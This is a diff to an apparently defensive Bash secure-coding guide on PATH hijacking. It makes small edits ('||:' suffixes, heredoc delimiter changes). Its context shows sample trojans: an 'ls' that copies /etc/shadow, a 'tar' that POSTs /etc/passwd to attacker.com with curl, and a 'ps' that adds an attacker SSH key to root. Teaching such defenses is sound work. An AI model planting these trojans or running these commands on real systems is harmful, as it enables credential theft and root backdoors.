@@ -32,14 +32,14 @@ command=$(which ls)  # Searches only trusted directories
 set -euo pipefail
 
 # ✓ Correct - validate PATH contains no dangerous elements
-[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory'
-[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element'
-[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element'
-[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element'
+[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory' ||:
+[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element' ||:
+[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element' ||:
+[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element' ||:
 
 # Additional checks for suspicious paths
-[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp'
-[[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory'
+[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp' ||:
+[[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory' ||:
 ```
 
 **Attack Example 1: Current Directory in PATH**
@@ -57,14 +57,14 @@ ls -la /etc > /tmp/backup_list.txt
 **Attack:**
 ```bash
 # Attacker creates malicious 'ls' in /tmp
-cat > /tmp/ls << 'EOF'
+cat > /tmp/ls << 'EOT'
 #!/bin/bash
 # Steal sensitive data
 cp /etc/shadow /tmp/stolen_shadow
 chmod 644 /tmp/stolen_shadow
 # Now execute real ls to appear normal
 /bin/ls "$@"
-EOF
+EOT
 chmod +x /tmp/ls
 
 # Attacker sets PATH with /tmp first
@@ -91,13 +91,13 @@ PATH=/usr/local/bin::/usr/bin:/bin
 **Attack:**
 ```bash
 # Attacker creates malicious command in accessible directory
-cat > ~/tar << 'EOF'
+cat > ~/tar << 'EOT'
 #!/bin/bash
 # Exfiltrate data
 curl -X POST -d @/etc/passwd https://attacker.com/collect
 # Execute real command
 /bin/tar "$@"
-EOF
+EOT
 chmod +x ~/tar
 
 # Vulnerable script runs from ~
@@ -116,14 +116,14 @@ PATH=/opt/local/bin:/usr/local/bin:/usr/bin:/bin
 **Attack:**
 ```bash
 # Attacker creates trojan in writable PATH directory
-cat > /opt/local/bin/ps << 'EOF'
+cat > /opt/local/bin/ps << 'EOT'
 #!/bin/bash
 # Backdoor: Add SSH key for root access
 mkdir -p /root/.ssh
 echo "ssh-rsa AAAA... attacker@evil" >> /root/.ssh/authorized_keys
 # Execute real ps
 /bin/ps "$@"
-EOF
+EOT
 chmod +x /opt/local/bin/ps
 
 # When ANY script runs 'ps', attacker gains root access
@@ -318,11 +318,11 @@ debug() {
 check_path_security() {
   local -a issues=()
 
-  [[ "$PATH" =~ \\.  ]] && issues+=('contains current directory (.)')
-  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element')
-  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)')
-  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element')
-  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp')
+  [[ "$PATH" =~ \\.  ]] && issues+=('contains current directory (.)') ||:
+  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element') ||:
+  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)') ||:
+  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element') ||:
+  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp') ||:
 
   if ((${#issues[@]} > 0)); then
     error 'PATH security issues detected:'
